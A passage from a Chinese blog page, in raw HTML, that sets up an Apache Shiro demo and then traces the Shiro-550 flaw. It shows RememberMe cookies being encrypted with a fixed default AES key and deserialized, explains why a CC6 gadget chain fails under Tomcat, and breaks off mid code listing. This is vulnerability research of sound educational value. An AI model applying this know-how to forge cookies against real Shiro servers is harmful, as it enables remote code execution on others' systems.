class="hljs-name">version</span>&gt;</span>1.7.30<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>commons-logging<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>commons-logging<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.2<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>在 Resource 目录下创建 <code>shiro.ini</code> 文件，用来让 IniRealm 获取用户的相关数据</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[users]</span><br><span class="hljs-comment"># 用户名=密码,角色1,角色2,...</span><br><span class="hljs-attr">admin</span>=<span class="hljs-number">123456</span>,admin<br><span class="hljs-attr">guest</span>=guest,guest<br><br><span class="hljs-section">[roles]</span><br><span class="hljs-attr">admin</span>=*<br><span class="hljs-attr">guest</span>=read<br></code></pre></td></tr></table></figure><p>login 测试代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.lingx5;<br><br><span class="hljs-keyword">import</span> org.apache.shiro.SecurityUtils;<br><span class="hljs-keyword">import</span> org.apache.shiro.authc.AuthenticationException;<br><span class="hljs-keyword">import</span> org.apache.shiro.authc.UsernamePasswordToken;<br><span class="hljs-keyword">import</span> org.apache.shiro.config.IniSecurityManagerFactory;<br><span class="hljs-keyword">import</span> org.apache.shiro.mgt.SecurityManager;<br><span class="hljs-keyword">import</span> org.apache.shiro.subject.Subject;<br><span class="hljs-keyword">import</span> org.apache.shiro.util.Factory;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Login</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-comment">// 1. 通过ini配置文件创建SecurityManager工厂</span><br>        Factory&lt;SecurityManager&gt; factory = <span class="hljs-keyword">new</span> <span class="hljs-title class_">IniSecurityManagerFactory</span>(<span class="hljs-string">&quot;classpath:shiro.ini&quot;</span>);<br>        <span class="hljs-comment">// 2. 获取SecurityManager实例并设置到SecurityUtils</span><br>        <span class="hljs-type">SecurityManager</span> <span class="hljs-variable">securityManager</span> <span class="hljs-operator">=</span> factory.getInstance();<br>        SecurityUtils.setSecurityManager(securityManager);<br>        <span class="hljs-comment">// 3. 获取当前用户(Subject)</span><br>        <span class="hljs-type">Subject</span> <span class="hljs-variable">currentUser</span> <span class="hljs-operator">=</span> SecurityUtils.getSubject();<br>        <span class="hljs-comment">// 4. 登录认证</span><br>        <span class="hljs-type">UsernamePasswordToken</span> <span class="hljs-variable">token</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UsernamePasswordToken</span>(<span class="hljs-string">&quot;admin&quot;</span>, <span class="hljs-string">&quot;123456&quot;</span>);<br>        <span class="hljs-keyword">try</span>&#123;<br>            currentUser.login(token);<br>            System.out.println(<span class="hljs-string">&quot;登录成功&quot;</span>);<br>        &#125;<span class="hljs-keyword">catch</span> (AuthenticationException e)&#123;<br>            System.out.println(<span class="hljs-string">&quot;登录失败&quot;</span>);<br>        &#125;<br>        <span class="hljs-comment">// 5. 角色和权限校验</span><br>        <span class="hljs-keyword">if</span>(currentUser.hasRole(<span class="hljs-string">&quot;admin&quot;</span>)) &#123;<br>            System.out.println(<span class="hljs-string">&quot;用户拥有admin角色&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">if</span>(currentUser.isPermitted(<span class="hljs-string">&quot;*&quot;</span>)) &#123;<br>            System.out.println(<span class="hljs-string">&quot;用户拥有所有权限&quot;</span>);<br>        &#125;<br>        <span class="hljs-comment">// 6. 登出</span><br>        currentUser.logout();<br>        System.out.println(<span class="hljs-string">&quot;用户已登出&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>目录结构</p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250416161643740.png" alt="image-20250416161643740" style="zoom:50%;" /><p>输出结果</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250416161444436.png" alt="image-20250416161444436"></p><p>现在让我们来学习一下 shiro 的漏洞</p><h2 id="Shiro550"><a href="#Shiro550" class="headerlink" title="Shiro550"></a>Shiro550</h2><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>下载地址：<a href="https://codeload.github.com/apache/shiro/zip/shiro-root-1.2.4">https://codeload.github.com/apache/shiro/zip/shiro-root-1.2.4</a></p><p>部署 samples-web</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250418142722287.png" alt="image-20250418142722287"></p><p>修改 <code>samples-web</code> 的 pom.xml 文件</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>javax.servlet<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>jstl<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.2<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>runtime<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>当然默认是 jdk6，你也可以在父工程的 <code>pom</code> 文件中切换 jdk 的编译版本</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250418143004645.png" alt="image-20250418143004645"></p><p>启动项目</p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250418143034911.png" alt="image-20250418143034911" style="zoom: 50%;" /><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><h4 id="shiro-交互流程"><a href="#shiro-交互流程" class="headerlink" title="shiro 交互流程"></a>shiro 交互流程</h4><p>勾选 Remember Me 登录一下</p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250418143736071.png" alt="image-20250418143736071" style="zoom:50%;" /><p>首先就是发送正常的表单数据</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250418144134210.png" alt="image-20250418144134210"></p><p>服务器响应 Set-Cookie: rememberMe &#x3D;….</p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250418144217725.png" alt="image-20250418144217725" style="zoom: 50%;" /><p>接着客户端会发送一个带有 remeberMe 字段的请求</p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250418144432971.png" alt="image-20250418144432971" style="zoom: 33%;" /><p>然后就会等了成功</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250418144523837.png" alt="image-20250418144523837"></p><h4 id="RememberMe-的生成"><a href="#RememberMe-的生成" class="headerlink" title="RememberMe 的生成"></a>RememberMe 的生成</h4><p>看到勾选了 RememberMe 的选项后，服务器端会返回来一个 <code>Set-Cookie: rememberMe=</code> 的字段，客户端再次发送请求会带上这个值</p><p>我们来源码看一下这个值是如何生成的</p><p>在 idea 里搜索 <code>RememberMe</code> 会看到 org.apache.shiro.web.mgt.CookieRememberMeManager 这个类，看类名他应该就是管理 Cookie 中的 RememberMe 的</p><p>在 org.apache.shiro.web.mgt.CookieRememberMeManager#rememberSerializedIdentity 方法打断点，这个方法名叫 <code>remember序列化表示</code> 应该就是生成 RememberMe 字段的方法</p><p>我们发送请求，发现确实会断在这里</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250418151532825.png" alt="image-20250418151532825"></p><p>看一下调用栈</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs stylus">rememberSerializedIdentity:<span class="hljs-number">137</span>, CookieRememberMeManager (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.shiro</span><span class="hljs-selector-class">.web</span>.mgt)<br>rememberIdentity:<span class="hljs-number">347</span>, AbstractRememberMeManager (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.shiro</span>.mgt)<br>rememberIdentity:<span class="hljs-number">321</span>, AbstractRememberMeManager (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.shiro</span>.mgt)<br>onSuccessfulLogin:<span class="hljs-number">297</span>, AbstractRememberMeManager (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.shiro</span>.mgt)<br>rememberMeSuccessfulLogin:<span class="hljs-number">206</span>, DefaultSecurityManager (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.shiro</span>.mgt)<br>onSuccessfulLogin:<span class="hljs-number">291</span>, DefaultSecurityManager (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.shiro</span>.mgt)<br>login:<span class="hljs-number">285</span>, DefaultSecurityManager (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.shiro</span>.mgt)<br>login:<span class="hljs-number">256</span>, DelegatingSubject (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.shiro</span><span class="hljs-selector-class">.subject</span>.support)<br>executeLogin:<span class="hljs-number">53</span>, AuthenticatingFilter (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.shiro</span><span class="hljs-selector-class">.web</span><span class="hljs-selector-class">.filter</span>.authc)<br></code></pre></td></tr></table></figure><p>这也符合我们在入门时的分析，由 Filter 拦截到请求，交给 Subject 执行登录，会调用 SecurityManager 完成从 Realm 获取用户信息并判断登录是否成功</p><p>我们接着看上图 rememberSerializedIdentity 这个方法，后续流程就是把 serialized 参数，进行 base64 编码，设置到 cookie 中</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250418162158232.png" alt="image-20250418162158232"></p><p>我们主要得分析 <code>serialized</code> 参数，是如何得来的</p><p>在 上一层调用栈 <code>rememberIdentity:347, AbstractRememberMeManager (org.apache.shiro.mgt)</code> 中看到 serialized 参数就是用户表示序列化后加密得到的</p><center>    <img src="https://gitee.com/ling-x5/img/raw/master/image-20250418154829591.png" alt="image-20250418154829591" width=450px/>    <img src="https://gitee.com/ling-x5/img/raw/master/image-20250418154957897.png" alt="image-20250418154829591" width=450px/></center><p>跟一下加密这个函数 看到要获取 CipherService 这个加密服务类，调用它对应的 encrypt 方法进行加密</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">protected</span> <span class="hljs-type">byte</span>[] encrypt(<span class="hljs-type">byte</span>[] serialized) &#123;<br>        <span class="hljs-type">byte</span>[] value = serialized;<br>        <span class="hljs-type">CipherService</span> <span class="hljs-variable">cipherService</span> <span class="hljs-operator">=</span> getCipherService();<br>        <span class="hljs-keyword">if</span> (cipherService != <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-type">ByteSource</span> <span class="hljs-variable">byteSource</span> <span class="hljs-operator">=</span> cipherService.encrypt(serialized, getEncryptionCipherKey());<br>            value = byteSource.getBytes();<br>        &#125;<br>        <span class="hljs-keyword">return</span> value;<br>    &#125;<br></code></pre></td></tr></table></figure><p>但是这个加密服务的实现类有 6 个，我们不确定是哪一个</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250418162648596.png" alt="image-20250418162648596"></p><p>我们在 org.apache.shiro.mgt.AbstractRememberMeManager#encrypt 函数打个断点，在发一次包，看看是调用的那个加密服务</p><p>看到调用的 AES 加密</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250418163413548.png" alt="image-20250418163413548"></p><p>AES 加密就只需要明文和密钥，密钥就是 getEncryptionCipherKey() 这个方法获取的</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250418164320179.png" alt="image-20250418164320179"></p><p>我们跟一下这个方法，看密钥是如何生成的。看到 get 方法直接 return 了</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-type">byte</span>[] getEncryptionCipherKey() &#123;<br>    <span class="hljs-keyword">return</span> encryptionCipherKey;<br>&#125;<br></code></pre></td></tr></table></figure><p>我们找一下 encryptionCipherKey 的 setter 方法</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250418164529148.png" alt="image-20250418164529148"></p><p>看看谁在调用它，给 encryptionCipherKey 赋值</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250418164707431.png" alt="image-20250418164707431"></p><p>找到了 AbstractRememberMeManager#setCipherKey 方法，<span style="color:#CC0000;"> 看到加密的 key 和解密的 key 是一个 </span></p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250418164758838.png" alt="image-20250418164758838"></p><p>继续找一下 setCipherKey 的调用</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250418164839829.png" alt="image-20250418164839829"></p><p>找到了 AbstractRememberMeManager 的构造方法</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250418164912359.png" alt="image-20250418164912359"></p><p>看到设置的是一个常量 DEFAULT_CIPHER_KEY_BYTES，也很好定位到</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250418165053370.png" alt="image-20250418165053370"></p><h4 id="加密小结"><a href="#加密小结" class="headerlink" title="加密小结"></a>加密小结</h4><p>把用户的身份表示 principals 序列化后，用固定的 key 进行了 AES 加密，设置到了 cookie 的 RememberMe 中</p><h4 id="RememberMe-解密"><a href="#RememberMe-解密" class="headerlink" title="RememberMe 解密"></a>RememberMe 解密</h4><p>我们发送带有 RememberMe 字段的请求</p><blockquote><p>注意要删除 JSESSIONID 字段</p><p>其实这也很好理解，因为 JSESSIONID 是会话标识，表明当前请求绑定的活动会话，也就是说当前回话还没有断开。</p><p>而 RememberMe 是“免登录”凭据，及回话断开后，下次访问免登录的设置</p></blockquote><p>在 CookieRememberMeManager 中有 getRememberedSerializedIdentity 方法，我们把断点下在这里，跟一下</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250418183935346.png" alt="image-20250418183935346"></p><p>return 出来后，来到 AbstractRememberMeManager#getRememberedPrincipals 方法，解析二进制的 byte 流，转化为 principals</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250418184217097.png" alt="image-20250418184217097"></p><p>我们跟进这个 convertBytesToPrincipals 方法</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250418184329300.png" alt="image-20250418184329300"></p><p>看一下 decrypt</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250418184454169.png" alt="image-20250418184454169"></p><p>看一下 decrypt 会来到 JcaCipherService#decrypt 这个实现</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> ByteSource <span class="hljs-title function_">decrypt</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] ciphertext, <span class="hljs-type">byte</span>[] key)</span> <span class="hljs-keyword">throws</span> CryptoException &#123;<br><br>       <span class="hljs-type">byte</span>[] encrypted = ciphertext;<br><br>       <span class="hljs-comment">//No IV, check if we need to read the IV from the stream:</span><br>       <span class="hljs-type">byte</span>[] iv = <span class="hljs-literal">null</span>;<br><br>       <span class="hljs-keyword">if</span> (isGenerateInitializationVectors(<span class="hljs-literal">false</span>)) &#123;<br>           <span class="hljs-keyword">try</span> &#123;<br>               <span class="hljs-comment">//We are generating IVs, so the ciphertext argument array is not actually 100% cipher text.  Instead, it</span><br>               <span class="hljs-comment">//is:</span><br>               <span class="hljs-comment">// - the first N bytes is the initialization vector, where N equals the value of the</span><br>               <span class="hljs-comment">// &#x27;initializationVectorSize&#x27; attribute.</span><br>               <span class="hljs-comment">// - the remaining bytes in the method argument (arg.length - N) is the real cipher text.</span><br><br>               <span class="hljs-comment">//So we need to chunk the method argument into its constituent parts to find the IV and then use</span><br>               <span class="hljs-comment">//the IV to decrypt the real ciphertext:</span><br><br>               <span class="hljs-type">int</span> <span class="hljs-variable">ivSize</span> <span class="hljs-operator">=</span> getInitializationVectorSize();<br>               <br>               <span class="hljs-type">int</span> <span class="hljs-variable">ivByteSize</span> <span class="hljs-operator">=</span> ivSize / BITS_PER_BYTE; <span class="hljs-comment">// ivByteSize = 16</span><br><br>               <span class="hljs-comment">//now we know how large the iv is, so extract the iv bytes:</span><br>               iv = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[ivByteSize];<br>               <span class="hljs-comment">// 把RememberMe的前16个字节复制到 iv 中</span><br>               System.arraycopy(ciphertext, <span class="hljs-number">0</span>, iv, <span class="hljs-number">0</span>, ivByteSize); <br><br>               <span class="hljs-comment">//remaining data is the actual encrypted ciphertext.  Isolate it:</span><br>               <span class="hljs-type">int</span> <span class="hljs-variable">encryptedSize</span> <span class="hljs-operator">=</span> ciphertext.length - ivByteSize;<br>               encrypted = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[encryptedSize];<br>               <span class="hljs-comment">// 把出去iv 的后续字节 复制到 encrypted 这个字节数组中</span><br>               System.arraycopy(ciphertext, ivByteSize, encrypted, <span class="hljs-number">0</span>, encryptedSize);<br>           &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>               <span class="hljs-type">String</span> <span class="hljs-variable">msg</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;Unable to correctly extract the Initialization Vector or ciphertext.&quot;</span>;<br>               <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CryptoException</span>(msg, e);<br>           &#125;<br>       &#125;<br><span class="hljs-comment">// 再用encrypted、iv和key 做AES的解密</span><br>       <span class="hljs-keyword">return</span> decrypt(encrypted, key, iv);<br>   &#125;<br></code></pre></td></tr></table></figure><h4 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h4><p>接下来就是 deserialize 反序列化了，不过值得注意的是 这个 inputStream 流对象是 ClassResolvingObjectInputStream </p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250418184648233.png" alt="image-20250418184648233"></p><p>而 ClassResolvingObjectInputStream 这个类重写了 resolveClass 方法，所以在反序列化的过程中会走重写的 resolveClass，而不会走 ObjectInputStream 默认的 resolveClass 方法</p><blockquote><p>具体在 <a href="https://www.cnblogs.com/LINGX5/p/18809006#hashmap-%E5%B0%81%E8%A3%85%E7%9A%84%E5%B7%A7%E7%94%A8">fastjson 原生反序列化链 - LingX5 - 博客园</a> 这片文章中讲到过</p></blockquote><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250418185421217.png" alt="image-20250418185421217"></p><p>看到调用的是 org.apache.shiro.util.ClassUtils#forName 而不是 JDK 的 java.lang.Class#forName(java.lang.String)方法</p><p>可以看一下 ClassUtils#forName 这个方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Class <span class="hljs-title function_">forName</span><span class="hljs-params">(String fqcn)</span> <span class="hljs-keyword">throws</span> UnknownClassException &#123;<br><br>    <span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> THREAD_CL_ACCESSOR.loadClass(fqcn);<br><br>    <span class="hljs-keyword">if</span> (clazz == <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-keyword">if</span> (log.isTraceEnabled()) &#123;<br>            log.trace(<span class="hljs-string">&quot;Unable to load class named [&quot;</span> + fqcn +<br>                      <span class="hljs-string">&quot;] from the thread context ClassLoader.  Trying the current ClassLoader...&quot;</span>);<br>        &#125;<br>        clazz = CLASS_CL_ACCESSOR.loadClass(fqcn);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (clazz == <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-keyword">if</span> (log.isTraceEnabled()) &#123;<br>            log.trace(<span class="hljs-string">&quot;Unable to load class named [&quot;</span> + fqcn + <span class="hljs-string">&quot;] from the current ClassLoader.  &quot;</span> +<br>                      <span class="hljs-string">&quot;Trying the system/application ClassLoader...&quot;</span>);<br>        &#125;<br>        clazz = SYSTEM_CL_ACCESSOR.loadClass(fqcn);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (clazz == <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">msg</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;Unable to load class named [&quot;</span> + fqcn + <span class="hljs-string">&quot;] from the thread context, current, or &quot;</span> +<br>            <span class="hljs-string">&quot;system/application ClassLoaders.  All heuristics have been exhausted.  Class could not be found.&quot;</span>;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnknownClassException</span>(msg);<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> clazz;<br>&#125;<br></code></pre></td></tr></table></figure><p>其内部实现，就是调用了 <code>ClassLoader.loadClass() 的方式</code> 进行类加载，ClassLoader.loadClass()这种方式无法加载数组类型的。<span style="color:#FF0000;">（但是这里也不是纯正的 ClassLoader.loadClass，这里会涉及到 tomcat 的类加载委派机制）</span></p><p>而 java.lang.Class#forName 会去调用 forName0() 这个 native 方法，利用 JVM 的内部机制，能够识别数组类的特殊命名格式</p><p>但是在这里是 tomcat 的环境，本质上是调用的 Tomcat 的 <strong>Webapp ClassLoader</strong>，后边还是会委托给 Class#forName 加载 <strong>外部的数组类型 <code>（Transformer[]）</code></strong>，由于委托的父类加载器 URLClassLoader 的搜索路径没有 CommonsCollections 这个依赖，所以会加载失败。</p><p>所以在进行传统 CC 链攻击的时候，由于无法加载 Transformer [] 这个数组类型，会抛出异常</p><p>我们可以利用 TemplatesImpl 或者 CB 链来实现攻击</p><h4 id="CC6-失败的原因"><a href="#CC6-失败的原因" class="headerlink" title="CC6 失败的原因"></a>CC6 失败的原因</h4><p>加入 tomcat 的依赖</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.tomcat.embed<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>tomcat-embed-core<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>7.0.109<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>我们来看一下调试看一下这个类加载过程</p><blockquote><p>  Class clazz &#x3D; THREAD_CL_ACCESSOR.loadClass(fqcn);</p></blockquote><p>步入就来到了 ClassUtils.ExceptionIgnoringAccessor#loadClass 这个方法，看到 getClassLoader 就是 tomcat 的 WebappClassLoader</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250420093552991.png" alt="image-20250420093552991"></p><p>我们接着步入 来到 org.apache.catalina.loader.WebappClassLoaderBase#loadClass 方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span 